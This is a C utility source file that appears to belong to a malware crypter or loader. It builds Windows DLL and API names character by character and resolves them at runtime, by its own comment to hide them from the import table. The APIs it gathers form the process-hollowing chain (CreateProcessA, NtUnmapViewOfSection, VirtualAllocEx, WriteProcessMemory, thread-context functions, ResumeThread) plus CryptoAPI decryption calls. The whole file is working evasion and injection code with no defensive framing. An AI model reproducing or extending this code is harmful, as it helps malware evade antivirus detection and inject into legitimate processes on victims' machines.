#include "utils.h"

pCryptReleaseContext fCryptReleaseContext = NULL;
pCryptDestroyHash fCryptDestroyHash = NULL;
pCryptDestroyKey fCryptDestroyKey = NULL;
pCryptGenRandom fCryptGenRandom = NULL;
pCryptDeriveKey fCryptDeriveKey = NULL;
pNTUnmapViewOfSections fNTUnmap = NULL;
pCryptCreateHash fCreateHash = NULL;
pGetModFileName fGetModFname = NULL;
pWriteProcMem fWriteProcMem = NULL;
pCryptEncrypt fCryptEncrypt = NULL;
pCryptGetCtx fGetCryptCtx = NULL;
pGetThreadCon fGetThrCtx = NULL;
pResumeThread fResumeThr = NULL;
pSetThreadCon fSetThrCtx = NULL;	
pCryptHashData fHashData = NULL;
pCreateProc fCreateProc = NULL;
pVAlloc fVAlloc = NULL;

/*
 * Function that fills function pointers
 * for API hidden from the Import Address
 * Table using LoadLibrary/GetProcAddress.
 * 
 * returns TRUE if successful, FALSE 
 * otherwise
 */
BOOL FillApi(void) {
	
	HMODULE hNt;
	HMODULE hAdv;
	HMODULE hKernel;
	
	const int objSize = MAX_PATH * sizeof(CHAR);
	CHAR *func = (CHAR *) malloc( objSize );
	if(func == NULL) {
		DebugPrintA("malloc failed\n");
		return FALSE;
	}
	ZeroMemory( func, objSize );
	
	sprintf_s(func, objSize, "%c%c%c%c%c%c%d%d", K,E,R,N,E,L,3,2);
	DebugPrintA("%s\n", func);
	hKernel = LoadLibraryA(func);
	if(!hKernel) {
		ZeroMemory(func, objSize );
		free(func);
		return FALSE;
	}

	sprintf_s(func, objSize, "%c%c%c%c%c", N, T, D, L, L);
	DebugPrintA("%s\n", func);
	hNt = LoadLibraryA(func);
	if(!hNt) {
		ZeroMemory(func, objSize );
		free(func);
		return FALSE;
	}

	sprintf_s(func, objSize, "%c%c%c%c%c%c%d%d", A,D,V,A,P,I,3,2);
	DebugPrintA("%s\n", func);
	hAdv = LoadLibraryA(func);
	if(!hAdv) {
		ZeroMemory(func, objSize );
		free(func);
		return FALSE;
	}

	sprintf_s(func, objSize, "%c%c%c%c%c%c%c%c%c%c%c%c%c%c", Cu,R,E,A,T,E,Pu,R,O,C,E,S,S,Au);
	DebugPrintA("%s\n", func);
	fCreateProc = (pCreateProc)GetProcAddress(hKernel, func);
	if(!fCreateProc) {
		ZeroMemory( func, objSize );
		free(func);
		return FALSE;
	}

	sprintf_s(func, objSize, "%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c", Nu,T,Uu,N,M,A,P,Vu,I,E,W,Ou,F,Su,E,C,T,I,O,N);
	DebugPrintA("%s\n", func);
	fNTUnmap = (pNTUnmapViewOfSections)GetProcAddress(hNt, func);
	if(!fNTUnmap) {
		ZeroMemory( func, objSize );
		free(func);
		return FALSE;
	}

	sprintf_s(func, objSize, "%c%c%c%c%c%c%c%c%c%c%c%c%c%c", Vu,I,R,T,U,A,L,Au,L,L,O,C,Eu,X);
	DebugPrintA("%s\n", func);
	fVAlloc = (pVAlloc)GetProcAddress(hKernel, func);
	if(!fVAlloc) {
		ZeroMemory( func, objSize );
		free(func);
		return FALSE;
	}

	sprintf_s(func, objSize, "%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c", Wu,R,I,T,E,Pu,R,O,C,E,S,S,Mu,E,M,O,R,Y);
	DebugPrintA("%s\n", func);
	fWriteProcMem = (pWriteProcMem)GetProcAddress(hKernel, func);
	if(!fWriteProcMem) {
		ZeroMemory( func, objSize );
		free(func);
		return FALSE;
	}
	
	sprintf_s(func, objSize, "%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c", Gu,E,T,Tu,H,R,E,A,D,Cu,O,N,T,E,X,T);
	DebugPrintA("%s\n", func);
	fGetThrCtx = (pGetThreadCon)GetProcAddress(hKernel, func);
	if(!fGetThrCtx) {
		ZeroMemory( func, objSize );
		free(func);
		return FALSE;
	}

	sprintf_s(func, objSize, "%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c", Su,E,T,Tu,H,R,E,A,D,Cu,O,N,T,E,X,T);
	DebugPrintA("%s\n", func);
	fSetThrCtx = (pSetThreadCon)GetProcAddress(hKernel, func);
	if(!fSetThrCtx) {
		ZeroMemory( func, objSize );
		free(func);
		return FALSE;
	}

	sprintf_s(func, objSize, "%c%c%c%c%c%c%c%c%c%c%c%c", Ru,E,S,U,M,E,Tu,H,R,E,A,D);
	DebugPrintA("%s\n", func);
	fResumeThr = (pResumeThread)GetProcAddress(hKernel, func);
	if(!fResumeThr) {
		ZeroMemory( func, objSize );
		free(func);
		return FALSE;
	}

	sprintf_s(func, objSize, "%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c", Gu,E,T,Mu,O,D,U,L,E,Fu,I,L,E,Nu,A,M,E,Au);
	DebugPrintA("%s\n", func);
	fGetModFname = (pGetModFileName)GetProcAddress(hKernel, func);
	if(!fGetModFname) {
		ZeroMemory( func, objSize );
		free(func);
		return FALSE;
	}

	sprintf_s(func, objSize, "%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c", Cu,R,Y,P,T,Au,C,Q,U,I,R,E,Cu,O,N,T,E,X,T,Au);
	DebugPrintA("%s\n", func);
	fGetCryptCtx = (pCryptGetCtx)GetProcAddress(hAdv, func);
	if(!fGetCryptCtx) {
		ZeroMemory( func, objSize );
		free(func);
		return FALSE;
	}

	sprintf_s(func, objSize, "%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c", Cu,R,Y,P,T,Cu,R,E,A,T,E,Hu,A,S,H);
	DebugPrintA("%s\n", func);
	fCreateHash = (pCryptCreateHash)GetProcAddress(hAdv, func);
	if(!fCreateHash) {
		ZeroMemory( func, objSize );
		free(func);
		return FALSE;
	}

	sprintf_s(func, objSize, "%c%c%c%c%c%c%c%c%c%c%c%c%c",Cu,R,Y,P,T,Hu,A,S,H,Du,A,T,A);
	DebugPrintA("%s\n", func);
	fHashData = (pCryptHashData)GetProcAddress(hAdv, func);
	if(!fHashData) {
		ZeroMemory( func, objSize );
		free(func);
		return FALSE;
	}

	sprintf_s(func, objSize, "%c%c%c%c%c%c%c%c%c%c%c%c%c%c", Cu, R, Y, P, T, Du, E, R, I, V, E, Ku, E, Y);
	DebugPrintA("%s\n", func);
	fCryptDeriveKey = (pCryptDeriveKey)GetProcAddress(hAdv, func);
	if(!fCryptDeriveKey) {
		ZeroMemory( func, objSize );
		free(func);
		return FALSE;
	}

	sprintf_s(func, objSize, "%c%c%c%c%c%c%c%c%c%c%c%c", Cu, R, Y, P, T, Eu, N, C, R, Y, P, T);
	DebugPrintA("%s\n", func);
	fCryptEncrypt = (pCryptEncrypt)GetProcAddress(hAdv, func);
	if(!fCryptEncrypt) {
		ZeroMemory( func, objSize );
		free(func);
		return FALSE;
	}

	sprintf_s(func, objSize, "%c%c%c%c%c%c%c%c%c%c%c%c%c%c", Cu, R, Y, P, T, Gu, E, N, Ru, A, N, D, O, M);
	DebugPrintA("%s\n", func);
	fCryptGenRandom = (pCryptGenRandom)GetProcAddress(hAdv, func);
	if(!fCryptGenRandom) {
		ZeroMemory( func, objSize );
		free(func);
		return FALSE;
	}

	sprintf_s(func, objSize, "%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c", Cu, R, Y, P, T, Du, E, S, T, R, O, Y, Ku, E, Y);
	DebugPrintA("%s\n", func);
	fCryptDestroyKey = (pCryptDestroyKey)GetProcAddress(hAdv, func);
	if(!fCryptDestroyKey) {
		ZeroMemory( func, objSize );
		free(func);
		return FALSE;
	}

	sprintf_s(func, objSize, "%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c", Cu, R, Y, P, T, Du, E, S, T, R, O, Y, Hu, A, S, H);
	DebugPrintA("%s\n", func);
	fCryptDestroyHash = (pCryptDestroyHash)GetProcAddress(hAdv, func);
	if(!fCryptDestroyHash) {
		ZeroMemory( func, objSize );
		free(func);
		return FALSE;
	}

	sprintf_s(func, objSize, "%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c", Cu, R, Y, P, T, Ru, E, L, E, A, S, E, Cu, O, N, T, E, X, T);
	DebugPrintA("%s\n", func);
	fCryptReleaseContext = (pCryptReleaseContext)GetProcAddress(hAdv, func);
	if(!fCryptReleaseContext) {
		ZeroMemory( func, objSize );
		free(func);
		return FALSE;
	}


	ZeroMemory(func, MAX_PATH*sizeof(CHAR));
	free(func);
	return TRUE;
}

/*
 * Function used for debugging purposes
 */
void DebugPrintA(char *format, ...) {
	
	const int bufSize = MAX_PATH * sizeof(char);
	char *buffer = (char *) malloc(bufSize);
	
	if(buffer == NULL) {
		OutputDebugStringA("Could not write debug\n");
	} else {
		va_list argptr;
		ZeroMemory( buffer, bufSize );
		va_start(argptr, format);
		vsprintf_s(buffer, bufSize, format, argptr);
		va_end(argptr);
		OutputDebugStringA(buffer);
	}

	free(buffer);
}
